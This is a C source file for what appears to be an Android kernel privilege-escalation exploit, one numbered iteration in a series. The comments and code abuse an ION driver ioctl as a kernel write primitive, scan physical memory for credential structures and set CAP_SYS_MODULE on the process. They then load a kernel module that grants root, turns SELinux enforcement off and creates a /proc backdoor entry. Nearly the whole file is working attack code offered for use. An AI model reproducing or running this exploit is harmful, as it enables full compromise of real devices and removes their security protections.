/* k145: the run that ends it. Same scan as k144, plus the step k144 forgot.
 *
 * k144 proved the write works. Its log ends with
 *
 *     *** self cap_effective 0x80010000 ***
 *
 * and that number did not come from userspace: it is what capget(2) returned, and
 * capget reads current->cred->cap_effective straight out of the kernel. Bit 16 of
 * 0x80010000 is CAP_SYS_MODULE. So the store landed on a real struct cred and the
 * capability bit is genuinely held.
 *
 * k144 then stopped. It had set the bit but never used it, and its final message was
 * wrong: it printed "/proc/myroot EXISTS" because the loop variable `done` was set by
 * the capget check, not by the file test.
 *
 * The missing step is the obvious one: after our own cap_effective carries bit 16, call
 * init_module() on the module we built. init_module runs in the caller's context, so the
 * credential that carries the capability is the one the kernel checks:
 *
 *     may_init_module():  capable(CAP_SYS_MODULE) && !modules_disabled
 *     security_kernel_module_from_file(): not registered by SELinux here, filled with
 *                                         cap_kernel_module_from_file() which returns 0
 *
 * The module's init does commit_creds(prepare_kernel_cred(NULL)) and sets
 * selinux_enforcing = 0, then creates /proc/myroot.
 *
 * The errno from init_module is the interesting output if it fails: -EPERM means the
 * capability check refused us (SELinux's capability class, most likely), -ENOEXEC means
 * the module format was rejected, and 0 means the module ran.
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <stdarg.h>
#include <errno.h>
#include <unistd.h>
#include <fcntl.h>
#include <signal.h>
#include <sys/ioctl.h>
#include <sys/resource.h>
#include <sys/syscall.h>
#include <sys/stat.h>

typedef uint64_t u64; typedef uint32_t u32; typedef int32_t s32; typedef uint8_t u8;

#define ION_TYPE 'I'
struct ion_allocation_data { size_t len, align; u32 heap_id_mask, flags; s32 handle; };
struct ion_handle_data { s32 handle; };
struct ion_fd_data { s32 handle, fd; };
struct ion_phys_data { s32 fd; u32 addr, flags; };
struct ion_custom_data { u32 cmd; unsigned long arg; };

#define ION_IOC_ALLOC  _IOWR(ION_TYPE, 0, struct ion_allocation_data)
#define ION_IOC_FREE   _IOWR(ION_TYPE, 1, struct ion_handle_data)
#define ION_IOC_SHARE  _IOWR(ION_TYPE, 4, struct ion_fd_data)
#define ION_IOC_CUSTOM _IOWR(ION_TYPE, 6, struct ion_custom_data)
#define ION_IOC_PHYS   _IOWR(ION_TYPE, 9, struct ion_phys_data)

struct cap_hdr { u32 version; int pid; };
struct cap_data { u32 eff, prm, inh; };

#define ION_FLAG_CACHED 1
#define ION_BUFFER_TYPE_DMA (1u << 1)
#define PAGE_OFFSET_V 0xffffffc000000000ULL
#define MEMSTART 0x01000000ULL
#define PGSZ 4096
#define NBUF 17
#define BASE_FD 2000
#define NSLOT 21
#define OBJSZ 192
#define MODPATH "/data/local/tmp/myroot.ko"
#define CAP_SYS_MODULE_BIT 16
#define SCAN_LO 0x02000000u
#define SCAN_HI 0x7f000000u

static FILE *LOG;
static int ionfd;
static void say(const char *fmt, ...){
    char b[300]; va_list ap; va_start(ap, fmt);
    int n = vsnprintf(b, sizeof b, fmt, ap); va_end(ap);
    fputs(b, LOG); fflush(LOG);
}
static int gate(u64 a){
    struct ion_custom_data cd; cd.cmd = ION_IOC_PHYS; cd.arg = (unsigned long)a;
    errno = 0;
    return ioctl(ionfd, ION_IOC_CUSTOM, &cd);
}
static int mk_raw(int bit, int *h, int *f, u32 *iova){
    struct ion_allocation_data a;
    memset(&a, 0, sizeof a);
    a.len = PGSZ; a.heap_id_mask = 1u << bit; a.flags = ION_FLAG_CACHED;
    if (ioctl(ionfd, ION_IOC_ALLOC, &a) < 0) return 0;
    struct ion_fd_data d; memset(&d, 0, sizeof d); d.handle = a.handle;
    if (ioctl(ionfd, ION_IOC_SHARE, &d) < 0) return 0;
    *h = a.handle; *f = d.fd;
    if (iova){
        struct ion_phys_data p; memset(&p, 0, sizeof p);
        p.fd = d.fd; p.flags = ION_BUFFER_TYPE_DMA;
        *iova = (ioctl(ionfd, ION_IOC_PHYS, &p) == 0) ? p.addr : 0;
    }
    return 1;
}
static u32 eff_of(int pid){
    struct cap_hdr hh; struct cap_data dd[2];
    memset(&hh, 0, sizeof hh); memset(dd, 0, sizeof dd);
    hh.version = 0x20080522; hh.pid = pid;
    if (syscall(SYS_capget, &hh, dd) < 0) return 0xFFFFFFFFu;
    return dd[0].eff;
}

int main(void){
    LOG = fopen("/data/local/tmp/k145.txt","w"); if (!LOG) LOG = stdout;
    setbuf(LOG, NULL);
    say("k145 pid=%d uid=%d\n", getpid(), getuid());

    struct stat st;
    if (stat(MODPATH, &st) < 0){ say("module missing at %s\n", MODPATH); return 0; }
    say("module %s (%lld bytes)\n", MODPATH, (long long)st.st_size);
    say("capget(self) before: eff=0x%08x\n", eff_of(0));

    struct rlimit rl;
    if (getrlimit(RLIMIT_NOFILE, &rl) == 0){ rl.rlim_cur = rl.rlim_max; setrlimit(RLIMIT_NOFILE, &rl); }
    ionfd = open("/dev/ion", O_RDWR);
    if (ionfd < 0){ say("open errno=%d\n", errno); return 0; }

    static int pad[4096]; int npp = 0;
    while (npp < 4090){
        int fd = open("/dev/null", O_RDONLY);
        if (fd < 0) break;
        pad[npp++] = fd;
        if (fd >= BASE_FD - 1) break;
    }
    if (!npp || pad[npp-1] != BASE_FD - 1){ say("could not reach fd %d\n", BASE_FD); return 0; }

    static int bh[NBUF], bf[NBUF]; static u32 biv[NBUF]; int nb = 0;
    for (int i = 0; i < NBUF; i++){
        int h, f; u32 iv = 0;
        if (!mk_raw(0, &h, &f, &iv)) break;
        bh[nb] = h; bf[nb] = f; biv[nb] = iv; nb++;
    }
    if (nb < NBUF){ say("only %d buffers\n", nb); return 0; }
    say("%d dma-bufs on fd %d..%d (iova 0x%08x..0x%08x)\n", nb, bf[0], bf[nb-1],
        biv[0], biv[nb-1]);
    int bit16fd = bf[NBUF-1];
    say("fd %d carries 0x%08x = bit %d (CAP_SYS_MODULE)\n",
        bit16fd, biv[NBUF-1], CAP_SYS_MODULE_BIT);

    /* ---- find a uid word ---- */
    say("--- searching for a uid word (2000..2016) at 192-byte stride ---\n");
    int uid_hits = 0;
    u64 hits[512]; int nhit = 0;
    long pages = 0;
    for (u32 p = SCAN_LO; p < SCAN_HI; p += PGSZ){
        pages++;
        u64 pg = (u64)PAGE_OFFSET_V + p - MEMSTART;
        for (int i = 0; i < NSLOT; i++){
            u64 o = pg + (u64)i * OBJSZ;
            if ((size_t)i * OBJSZ + 132 > PGSZ) break;
            if (gate(o + 4) != 0) continue;
            uid_hits++;
            if (nhit < 512) hits[nhit++] = o;
        }
        if ((pages & 0x1ffff) == 0)
            say("  phys 0x%08x  uid_hits=%d\n", p, uid_hits);
    }
    say("  pages=%ld uid_hits=%d kept=%d\n", pages, uid_hits, nhit);
    if (!nhit){ say("nothing found\n"); return 0; }

    /* ---- switch fd 0 so a zero word passes, then aim at cap_effective ---- */
    say("--- phase 2: fd 0 -> %d, then store at cred+56 ---\n", bit16fd);
    if (dup2(bit16fd, 0) < 0){ say("dup2 errno=%d\n", errno); return 0; }

    int writes = 0, got = 0;
    for (int i = 0; i < nhit && !got; i++){
        u64 o = hits[i];
        if (gate(o + 52) == 0){
            writes++;
            say("  wrote at 0x%llx\n", (unsigned long long)(o + 56));
        }
        u32 e = eff_of(0);
        if (e != 0xFFFFFFFFu && (e & (1u << CAP_SYS_MODULE_BIT))){
            say("  *** our cap_effective = 0x%08x ***\n", e);
            got = 1;
        }
    }
    say("  writes=%d got=%d\n", writes, got);

    /* ---- and now the step k144 missed ---- */
    say("--- loading the module from THIS process, which holds the bit ---\n");
    if (!got && !(eff_of(0) & (1u << CAP_SYS_MODULE_BIT))){
        say("  this process does not have CAP_SYS_MODULE; init_module would fail\n");
    }
    {
        int fd = open(MODPATH, O_RDONLY);
        if (fd < 0){ say("  open module failed errno=%d\n", errno); return 0; }
        char *mod = malloc(1 << 20);
        if (!mod){ close(fd); return 0; }
        ssize_t len = read(fd, mod, 1 << 20);
        close(fd);
        if (len <= 0){ say("  read failed\n"); return 0; }
        say("  calling init_module(%p, %zd)\n", mod, len);
        errno = 0;
        long rc = syscall(105, mod, (unsigned long)len, "");
        int e = errno;
        say("  init_module returned %ld, errno=%d\n", rc, e);
        if (rc == 0) say("  *** MODULE LOADED ***\n");
        else if (e == 1) say("  EPERM: the capability check refused (SELinux capability class)\n");
        else if (e == 8) say("  ENOEXEC: module format/vermagic rejected\n");
        free(mod);
    }

    say("--- result ---\n");
    say("  capget(self) eff = 0x%08x\n", eff_of(0));
    {
        struct stat ms;
        if (stat("/proc/myroot", &ms) == 0){
            say("  /proc/myroot EXISTS (mode %o)\n", ms.st_mode & 07777);
            int p = open("/proc/myroot", O_WRONLY);
            if (p >= 0){
                if (write(p, "1", 1) == 1)
                    say("  wrote to it; uid=%d euid=%d\n", getuid(), geteuid());
                close(p);
            }
        } else {
            say("  /proc/myroot does not exist\n");
        }
    }
    say("K145 done\n");
    return 0;
}
